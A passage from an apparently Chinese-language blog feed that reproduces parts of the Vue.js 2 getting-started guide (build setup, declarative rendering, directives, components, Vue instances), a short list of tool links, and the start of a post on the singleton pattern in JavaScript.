<p>Rollup<br>使用 rollup-plugin-replace：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> replace = <span class="built_in">require</span>(<span class="string">'rollup-plugin-replace'</span>)</span><br><span class="line"></span><br><span class="line">rollup(&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  plugins: [</span><br><span class="line">    replace(&#123;</span><br><span class="line">      <span class="string">'process.env.NODE_ENV'</span>: <span class="built_in">JSON</span>.stringify(<span class="string">'production'</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;).then(...)</span><br></pre></td></tr></table></figure></p>
<p>Browserify<br>为你的包应用一次全局的 envify 转换。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">NODE_ENV=production browserify -g envify -e main.js | uglifyjs -c -m &gt; build.js</span><br></pre></td></tr></table></figure></p>
<p>也可以移步生产环境部署。</p>
<h2 id="CSP-环境"><a href="#CSP-环境" class="headerlink" title="CSP 环境"></a>CSP 环境</h2><p>有些环境，如 Google Chrome Apps，会强制应用内容安全策略 (CSP)，不能使用 new Function() 对表达式求值。这时可以用 CSP 兼容版本。完整版本依赖于该功能来编译模板，所以无法在这些环境下使用。</p>
<p>另一方面，运行时版本则是完全兼容 CSP 的。当通过 webpack + vue-loader 或者 Browserify + vueify 构建时，模板将被预编译为 render 函数，可以在 CSP 环境中完美运行。</p>
<h2 id="开发版本"><a href="#开发版本" class="headerlink" title="开发版本"></a>开发版本</h2><p>重要: GitHub 仓库的 /dist 文件夹只有在新版本发布时才会提交。如果想要使用 GitHub 上 Vue 最新的源码，你需要自己构建！<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/vuejs/vue.git node_modules/vue</span><br><span class="line">cd node_modules/vue</span><br><span class="line">npm install</span><br><span class="line">npm run build</span><br></pre></td></tr></table></figure></p>
<h2 id="Bower"><a href="#Bower" class="headerlink" title="Bower"></a>Bower</h2><p>Bower 只提供 UMD 版本。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 最新稳定版本</span><br><span class="line">$ bower install vue</span><br></pre></td></tr></table></figure></p>
<h2 id="AMD-模块加载器"><a href="#AMD-模块加载器" class="headerlink" title="AMD 模块加载器"></a>AMD 模块加载器</h2><p>所有 UMD 版本都可以直接用作 AMD 模块。</p>
<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><h2 id="Vue-js-是什么"><a href="#Vue-js-是什么" class="headerlink" title="Vue.js 是什么"></a>Vue.js 是什么</h2><p>Vue (读音 /vjuː/，类似于 view) 是一套用于构建用户界面的渐进式框架。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与现代化的工具链以及各种支持类库结合使用时，Vue 也完全能够为复杂的单页应用提供驱动。</p>
<p>如果你想在深入学习 Vue 之前对它有更多了解，我们制作了一个视频，带您了解其核心概念和一个示例工程。</p>
<p>如果你已经是有经验的前端开发者，想知道 Vue 与其它库/框架有哪些区别，请查看对比其它框架。</p>
<h2 id="起步"><a href="#起步" class="headerlink" title="起步"></a>起步</h2><p>官方指南假设你已了解关于 HTML、CSS 和 JavaScript 的中级知识。如果你刚开始学习前端开发，将框架作为你的第一步可能不是最好的主意——掌握好基础知识再来吧！之前有其它框架的使用经验会有帮助，但这不是必需的。</p>
<p>尝试 Vue.js 最简单的方法是使用 JSFiddle 上的 Hello World 例子。你可以在浏览器新标签页中打开它，跟着例子学习一些基础用法。或者你也可以创建一个 .html 文件，然后通过如下方式引入 Vue：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 生产环境版本，优化了尺寸和速度 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>安装教程给出了更多安装 Vue 的方式。请注意我们不推荐新手直接使用 vue-cli，尤其是在你还不熟悉基于 Node.js 的构建工具时。<br>如果你喜欢交互式的东西，你也可以查阅这个 Scrimba 上的系列教程，它揉合了录屏和代码试验田，并允许你随时暂停和播放。</p>
<h2 id="声明式渲染"><a href="#声明式渲染" class="headerlink" title="声明式渲染"></a>声明式渲染</h2><p>Vue.js 的核心是一个允许采用简洁的模板语法来声明式地将数据渲染进 DOM 的系统：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  &#123;&#123; message &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    message: <span class="string">'Hello Vue!'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>我们已经成功创建了第一个 Vue 应用！看起来这跟渲染一个字符串模板非常类似，但是 Vue 在背后做了大量工作。现在数据和 DOM 已经被建立了关联，所有东西都是响应式的。我们要怎么确认呢？打开你的浏览器的 JavaScript 控制台 (就在这个页面打开)，并修改 app.message 的值，你将看到上例相应地更新。</p>
<p>除了文本插值，我们还可以像这样来绑定元素特性：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app-2"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-bind:title</span>=<span class="string">"message"</span>&gt;</span></span><br><span class="line">    鼠标悬停几秒钟查看此处动态绑定的提示信息！</span><br><span class="line">  <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app2 = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app-2'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    message: <span class="string">'页面加载于 '</span> + <span class="keyword">new</span> <span class="built_in">Date</span>().toLocaleString()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>这里我们遇到了一点新东西。你看到的 v-bind 特性被称为指令。指令带有前缀 v-，以表示它们是 Vue 提供的特殊特性。可能你已经猜到了，它们会在渲染的 DOM 上应用特殊的响应式行为。在这里，该指令的意思是：“将这个元素节点的 title 特性和 Vue 实例的 message 属性保持一致”。</p>
<p>如果你再次打开浏览器的 JavaScript 控制台，输入 app2.message = ‘新消息’，就会再一次看到这个绑定了 title 特性的 HTML 已经进行了更新。</p>
<h2 id="条件与循环"><a href="#条件与循环" class="headerlink" title="条件与循环"></a>条件与循环</h2><p>控制切换一个元素是否显示也相当简单：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app-3"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-if</span>=<span class="string">"seen"</span>&gt;</span>现在你看到我了<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app3 = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app-3'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    seen: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>继续在控制台输入 app3.seen = false，你会发现之前显示的消息消失了。</p>
<p>这个例子演示了我们不仅可以把数据绑定到 DOM 文本或特性，还可以绑定到 DOM 结构。此外，Vue 也提供一个强大的过渡效果系统，可以在 Vue 插入/更新/移除元素时自动应用过渡效果。</p>
<p>还有其它很多指令，每个都有特殊的功能。例如，v-for 指令可以绑定数组的数据来渲染一个项目列表：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app-4"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"todo in todos"</span>&gt;</span></span><br><span class="line">      &#123;&#123; todo.text &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app4 = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app-4'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    todos: [</span><br><span class="line">      &#123; <span class="attr">text</span>: <span class="string">'学习 JavaScript'</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">text</span>: <span class="string">'学习 Vue'</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">text</span>: <span class="string">'整个牛项目'</span> &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>在控制台里，输入 app4.todos.push({ text: ‘新项目’ })，你会发现列表最后添加了一个新项目。</p>
<h2 id="处理用户输入"><a href="#处理用户输入" class="headerlink" title="处理用户输入"></a>处理用户输入</h2><p>为了让用户和你的应用进行交互，我们可以用 v-on 指令添加一个事件监听器，通过它调用在 Vue 实例中定义的方法：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app-5"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">"reverseMessage"</span>&gt;</span>反转消息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app5 = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app-5'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    message: <span class="string">'Hello Vue.js!'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    reverseMessage: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.message = <span class="keyword">this</span>.message.split(<span class="string">''</span>).reverse().join(<span class="string">''</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>注意在 reverseMessage 方法中，我们更新了应用的状态，但没有触碰 DOM——所有的 DOM 操作都由 Vue 来处理，你编写的代码只需要关注逻辑层面即可。</p>
<p>Vue 还提供了 v-model 指令，它能轻松实现表单输入和应用状态之间的双向绑定。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app-6"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"message"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app6 = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app-6'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    message: <span class="string">'Hello Vue!'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="组件化应用构建"><a href="#组件化应用构建" class="headerlink" title="组件化应用构建"></a>组件化应用构建</h2><p>组件系统是 Vue 的另一个重要概念，因为它是一种抽象，允许我们使用小型、独立和通常可复用的组件构建大型应用。仔细想想，几乎任意类型的应用界面都可以抽象为一个组件树：</p>
<p>在 Vue 里，一个组件本质上是一个拥有预定义选项的一个 Vue 实例。在 Vue 中注册组件很简单：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义名为 todo-item 的新组件</span></span><br><span class="line">Vue.component(<span class="string">'todo-item'</span>, &#123;</span><br><span class="line">  template: <span class="string">'&lt;li&gt;这是个待办项&lt;/li&gt;'</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>现在你可以用它构建另一个组件模板：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 创建一个 todo-item 组件的实例 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">todo-item</span>&gt;</span><span class="tag">&lt;/<span class="name">todo-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>但是这样会为每个待办项渲染同样的文本，这看起来并不炫酷。我们应该能从父作用域将数据传到子组件才对。让我们来修改一下组件的定义，使之能够接受一个 prop：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.component(<span class="string">'todo-item'</span>, &#123;</span><br><span class="line">  <span class="comment">// todo-item 组件现在接受一个</span></span><br><span class="line">  <span class="comment">// "prop"，类似于一个自定义特性。</span></span><br><span class="line">  <span class="comment">// 这个 prop 名为 todo。</span></span><br><span class="line">  props: [<span class="string">'todo'</span>],</span><br><span class="line">  template: <span class="string">'&lt;li&gt;&#123;&#123; todo.text &#125;&#125;&lt;/li&gt;'</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>现在，我们可以使用 v-bind 指令将待办项传到循环输出的每个组件中：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app-7"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">      现在我们为每个 todo-item 提供 todo 对象</span></span><br><span class="line"><span class="comment">      todo 对象是变量，即其内容可以是动态的。</span></span><br><span class="line"><span class="comment">      我们也需要为每个组件提供一个“key”，稍后再</span></span><br><span class="line"><span class="comment">      作详细解释。</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">todo-item</span></span></span><br><span class="line"><span class="tag">      <span class="attr">v-for</span>=<span class="string">"item in groceryList"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">v-bind:todo</span>=<span class="string">"item"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">v-bind:key</span>=<span class="string">"item.id"</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">todo-item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.component(<span class="string">'todo-item'</span>, &#123;</span><br><span class="line">  props: [<span class="string">'todo'</span>],</span><br><span class="line">  template: <span class="string">'&lt;li&gt;&#123;&#123; todo.text &#125;&#125;&lt;/li&gt;'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app7 = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app-7'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    groceryList: [</span><br><span class="line">      &#123; <span class="attr">id</span>: <span class="number">0</span>, <span class="attr">text</span>: <span class="string">'蔬菜'</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">text</span>: <span class="string">'奶酪'</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">text</span>: <span class="string">'随便其它什么人吃的东西'</span> &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.component(<span class="string">'todo-item'</span>, &#123;</span><br><span class="line">  props: [<span class="string">'todo'</span>],</span><br><span class="line">  template: <span class="string">'&lt;li&gt;&#123;&#123; todo.text &#125;&#125;&lt;/li&gt;'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app7 = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app-7'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    groceryList: [</span><br><span class="line">      &#123; <span class="attr">id</span>: <span class="number">0</span>, <span class="attr">text</span>: <span class="string">'蔬菜'</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">text</span>: <span class="string">'奶酪'</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">text</span>: <span class="string">'随便其它什么人吃的东西'</span> &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>尽管这只是一个刻意设计的例子，但是我们已经设法将应用分割成了两个更小的单元。子单元通过 prop 接口与父单元进行了良好的解耦。我们现在可以进一步改进 <code>&lt;todo-item&gt;</code> 组件，提供更为复杂的模板和逻辑，而不会影响到父单元。</p>
<p>在一个大型应用中，有必要将整个应用程序划分为组件，以使开发更易管理。在后续教程中我们将详述组件，不过这里有一个 (假想的) 例子，以展示使用了组件的应用模板是什么样的：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">app-nav</span>&gt;</span><span class="tag">&lt;/<span class="name">app-nav</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">app-view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">app-sidebar</span>&gt;</span><span class="tag">&lt;/<span class="name">app-sidebar</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">app-content</span>&gt;</span><span class="tag">&lt;/<span class="name">app-content</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">app-view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="与自定义元素的关系"><a href="#与自定义元素的关系" class="headerlink" title="与自定义元素的关系"></a>与自定义元素的关系</h2><p>你可能已经注意到 Vue 组件非常类似于自定义元素——它是 Web 组件规范的一部分，这是因为 Vue 的组件语法部分参考了该规范。例如 Vue 组件实现了 Slot API 与 is 特性。但是，还是有几个关键差别：</p>
<ol>
<li>Web Components 规范已经完成并通过，但未被所有浏览器原生实现。目前 Safari 10.1+、Chrome 54+ 和 Firefox 63+ 原生支持 Web Components。相比之下，Vue 组件不需要任何 polyfill，并且在所有支持的浏览器 (IE9 及更高版本) 之下表现一致。必要时，Vue 组件也可以包装于原生自定义元素之内。</li>
<li>Vue 组件提供了纯自定义元素所不具备的一些重要功能，最突出的是跨组件数据流、自定义事件通信以及构建工具集成。</li>
</ol>
<p>虽然 Vue 内部没有使用自定义元素，不过在应用使用自定义元素、或以自定义元素形式发布时，依然有很好的互操作性。Vue CLI 也支持将 Vue 组件构建成为原生的自定义元素。</p>
<p>我们刚才简单介绍了 Vue 核心最基本的功能——本教程的其余部分将更加详细地涵盖这些功能以及其它高级功能，所以请务必读完整个教程！</p>
<h1 id="Vue-实例"><a href="#Vue-实例" class="headerlink" title="Vue 实例"></a>Vue 实例</h1><h2 id="创建一个-Vue-实例"><a href="#创建一个-Vue-实例" class="headerlink" title="创建一个 Vue 实例"></a>创建一个 Vue 实例</h2><p>每个 Vue 应用都是通过用 Vue 函数创建一个新的 Vue 实例开始的：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  <span class="comment">// 选项</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>虽然没有完全遵循 MVVM 模型，但是 Vue 的设计也受到了它的启发。因此在文档中经常会使用 vm (ViewModel 的缩写) 这个变量名表示 Vue 实例。</p>
<p>当创建一个 Vue 实例时，你可以传入一个选项对象。这篇教程主要描述的就是如何使用这些选项来创建你想要的行为。作为参考，你也可以在 API 文档 中浏览完整的选项列表。</p>
<p>一个 Vue 应用由一个通过 new Vue 创建的根 Vue 实例，以及可选的嵌套的、可复用的组件树组成。举个例子，一个 todo 应用的组件树可以是这样的：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">根实例</span><br><span class="line">└─ TodoList</span><br><span class="line">   ├─ TodoItem</span><br><span class="line">   │  ├─ DeleteTodoButton</span><br><span class="line">   │  └─ EditTodoButton</span><br><span class="line">   └─ TodoListFooter</span><br><span class="line">      ├─ ClearTodosButton</span><br><span class="line">      └─ TodoListStatistics</span><br></pre></td></tr></table></figure></p>
<p>我们会在稍后的组件系统章节具体展开。不过现在，你只需要明白所有的 Vue 组件都是 Vue 实例，并且接受相同的选项对象 (一些根实例特有的选项除外)。</p>
<h2 id="数据与方法"><a href="#数据与方法" class="headerlink" title="数据与方法"></a>数据与方法</h2><p>当一个 Vue 实例被创建时，它将 data 对象中的所有的属性加入到 Vue 的响应式系统中。当这些属性的值发生改变时，视图将会产生“响应”，即匹配更新为新的值。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 我们的数据对象</span></span><br><span class="line"><span class="keyword">var</span> data = &#123; <span class="attr">a</span>: <span class="number">1</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该对象被加入到一个 Vue 实例中</span></span><br><span class="line"><span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  data: data</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得这个实例上的属性</span></span><br><span class="line"><span class="comment">// 返回源数据中对应的字段</span></span><br><span class="line">vm.a == data.a <span class="comment">// =&gt; true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置属性也会影响到原始数据</span></span><br><span class="line">vm.a = <span class="number">2</span></span><br><span class="line">data.a <span class="comment">// =&gt; 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ……反之亦然</span></span><br><span class="line">data.a = <span class="number">3</span></span><br><span class="line">vm.a <span class="comment">// =&gt; 3</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>工具</title>
    <url>/2019/08/05/%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<a id="more"></a>
<p><a href="https://www.cnblogs.com/xishuai/p/mac-iterm2.html" target="_blank" rel="noopener">Mac OS 终端利器 iTerm2</a><br><a href="https://smallpdf.com/compress-pdf" target="_blank" rel="noopener">https://smallpdf.com</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式JavaScript描述</title>
    <url>/2019/09/26/javascript%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>GoF合作出版的《设计模式》这本书提供了许多有关与面向对象软件设计中常见问题的解决方案。这些模式已经出现了相当长的一段时间，已经被证明在许多情况下都非常有用。<br><a id="more"></a></p>
<h1 id="单体模式"><a href="#单体模式" class="headerlink" title="单体模式"></a>单体模式</h1><p>一个特定类仅有一个实例。这意味着当您第二次使用同一个类创建新对象的时候，应该得到与第一次所创建对象完全相同对象。</p>
<p>使用对象字面量创建一个简单的对象也是一个单体的例子,因为在JavaScript中没有类，只有对象。当您创建一个新对象时，实际上没有其他对象与其类似，因此新对象已经是单体了。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  myprop: <span class="string">'my value'</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h2 id="使用new操作符"><a href="#使用new操作符" class="headerlink" title="使用new操作符"></a>使用new操作符</h2><p>JavaScript没有类，但是可以通过new语法使用构造函数来创建对象，有时有可能需要使用这种语法的单体实现。这种思想在于当使用同一个构造函数以new操作符来创建多个对象时，应该仅获得指向完全相同的对象的新指针。</p>
<h2 id="静态属性中的实例"><a href="#静态属性中的实例" class="headerlink" title="静态属性中的实例"></a>静态属性中的实例</h2><p>在构造函数的静态属性中缓存该实例。您可以使用类似Universe.instance的属性并将实例缓存在该属性中。这中方案的缺点在于instance属性是公开可访问的属性，在外部代码中可能会修改该属性。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Universe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> Universe.instance === <span class="string">'object'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> Universe.instance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.start_time = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  Universe.instance = <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">var</span> uni = <span class="keyword">new</span> Universe();</span><br><span class="line"><span class="keyword">var</span> uni2 = <span class="keyword">new</span> Universe();</span><br><span class="line">uni === uni2; <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p>
<h2 id="闭包中的实例"><a href="#闭包中的实例" class="headerlink" title="闭包中的实例"></a>闭包中的实例</h2><p>可以将该实例包装在闭包中。这样可以保证该实例的私有性。其代价是带来了额外的闭包开销。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Universe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> instance = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.start_time = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  Universe = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果需要使原型和构造函数指针按照预期的那样运行，可以通过做一些调整来实现这个目标：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Universe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> instance;</span><br><span class="line"></span><br><span class="line">  Universe = <span class="function"><span class="keyword">function</span> <span class="title">Universe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  Universe.prototype = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">  instance = <span class="keyword">new</span> Universe();</span><br><span class="line"></span><br><span class="line">  instance.constructor = Universe;</span><br><span class="line"></span><br><span class="line">  instance.start_time = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
